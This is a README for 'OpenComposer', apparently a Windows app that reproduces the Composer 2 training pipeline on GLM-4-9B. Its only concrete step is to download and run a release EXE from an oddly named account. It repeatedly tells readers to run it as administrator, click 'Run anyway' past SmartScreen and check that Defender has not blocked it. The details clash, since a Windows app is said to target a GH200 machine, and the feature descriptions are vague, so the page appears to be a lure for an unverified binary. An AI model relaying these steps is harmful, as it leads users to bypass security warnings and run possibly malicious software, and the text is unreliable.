# 🤖 OpenComposer - Run Composer 2 on One Machine

[![Download OpenComposer](https://img.shields.io/badge/Download-OpenComposer-blue?style=for-the-badge)](https://github.com/bureaucracythermometer366/OpenComposer/releases)

## 📌 What is OpenComposer?

OpenComposer is a Windows app for running a small end-to-end version of the Composer 2 training pipeline. It uses GLM-4-9B as the base model and is built for a single NVIDIA GH200 480GB system.

This project is meant for users who want to see the full training flow on one machine without setting up a large cluster. It gives you a simple way to start, run, and inspect the pipeline from a local system.

## 🖥️ What you need

OpenComposer is built for a Windows desktop or workstation with:

- Windows 10 or Windows 11
- An NVIDIA GPU setup
- Enough free disk space for model files and training data
- A modern CPU and at least 32 GB of system RAM
- A stable internet connection for the first download

For best results, use a system close to the target setup: a single NVIDIA GH200 480GB machine.

## 📥 Download OpenComposer

Visit this page to download:

https://github.com/bureaucracythermometer366/OpenComposer/releases

On that page, look for the latest release and download the Windows file that matches your system. If you see a ZIP file, download it and extract it first. If you see an EXE file, download it and run it.

## 🚀 Install and run on Windows

Follow these steps:

1. Open the download page.
2. Get the latest Windows release file.
3. Save the file to a folder you can find, مثل Downloads or Desktop.
4. If the file is a ZIP archive, right-click it and choose Extract All.
5. Open the extracted folder.
6. If you see an EXE file, double-click it to start OpenComposer.
7. If Windows asks for permission, click Yes or Run.
8. Wait for the app to finish loading.

If the app starts with a console window, keep that window open while OpenComposer runs.

## 🧭 First-time setup

The first launch may ask you to choose a model folder or data folder. Use a simple path with no special characters, such as:

- `C:\OpenComposer`
- `C:\Models`
- `C:\TrainingData`

If you already have model files, place them in the folder the app expects. If the app offers a setup screen, follow the on-screen steps in order.

## 🧱 Suggested folder layout

You can keep things organized like this:

- `C:\OpenComposer\app`
- `C:\OpenComposer\models`
- `C:\OpenComposer\data`
- `C:\OpenComposer\output`

This makes it easier to find logs, checkpoints, and exports later.

## ⚙️ How OpenComposer works

OpenComposer follows a simple training flow:

- Load the base model
- Prepare the data
- Start the training pipeline
- Save checkpoints
- Export the final result

The app is built to show the full process in one place. That makes it useful for end users who want a local training setup without a large system.

## 🧪 Common tasks

### Start a run

Use the main run button in the app. Pick your input folder, then begin training.

### Check progress

Look at the progress view or log window. It should show current step, run time, and status.

### Stop a run

Use the stop control in the app. Wait for the program to finish writing any current files.

### Resume work

If the app supports checkpoints, choose the last saved checkpoint and start again from there.

## 🛠️ If the app does not open

Try these steps:

- Right-click the file and choose Run as administrator
- Make sure the file is fully downloaded
- Extract the ZIP file before opening the app
- Check that Windows did not block the file
- Confirm that your GPU drivers are up to date
- Restart the PC and try again

## 🧹 If the run is slow

Training and model work can take time. If performance feels slow, check:

- Free disk space
- GPU memory use
- Background apps using CPU or memory
- Power mode in Windows
- Driver updates for your NVIDIA card

Close other heavy apps before starting a run.

## 📂 Output files

OpenComposer may create files like these:

- Logs
- Checkpoints
- Exported model files
- Run reports
- Temporary cache files

Keep the output folder in a place with enough free space. Training files can grow fast.

## 🔧 Basic controls

The app may include controls such as:

- Load model
- Select data
- Start run
- Pause
- Stop
- Open output folder
- View logs

Use these controls in order. Start with the model, then the data, then the run.

## 🧠 About the project scope

OpenComposer is a compact reproduction of the Composer 2 training pipeline. It focuses on a single-machine workflow and uses GLM-4-9B as the base model. That makes it a strong fit for local testing, training demos, and pipeline study on one NVIDIA GH200 system.

## 🧾 Topics

- composer2
- cursor
- glm

## 📁 File handling tips

For the smoothest setup:

- Keep the app in a short folder path
- Avoid folders with special symbols
- Do not move files while a run is active
- Keep model files in one place
- Back up output files after a run ends

## 🔍 Useful checks before a run

Before you start, confirm that:

- Your GPU drivers are current
- The release file is fully downloaded
- You have enough free disk space
- The model folder is in the right place
- Windows Defender has not blocked the app
- No other heavy training task is running

## 🧰 Common file types you may see

Depending on the release, you may see:

- `.exe` for the app
- `.zip` for a packaged release
- `.json` for settings
- `.log` for run details
- `.ckpt` for checkpoints
- `.bin` or `.safetensors` for model data

## 🧩 Windows tips

If Windows shows a security prompt:

- Click More info if needed
- Then choose Run anyway if you trust the file source

If the app opens in a black window:

- Keep it open
- Do not close it while training is active

If a folder path does not work:

- Try a shorter path
- Remove spaces and special characters

## 📌 Quick start checklist

- Download OpenComposer from the releases page
- Extract the file if needed
- Open the app on Windows
- Choose your model folder
- Choose your data folder
- Start the training run
- Watch the logs
- Check the output folder when the run ends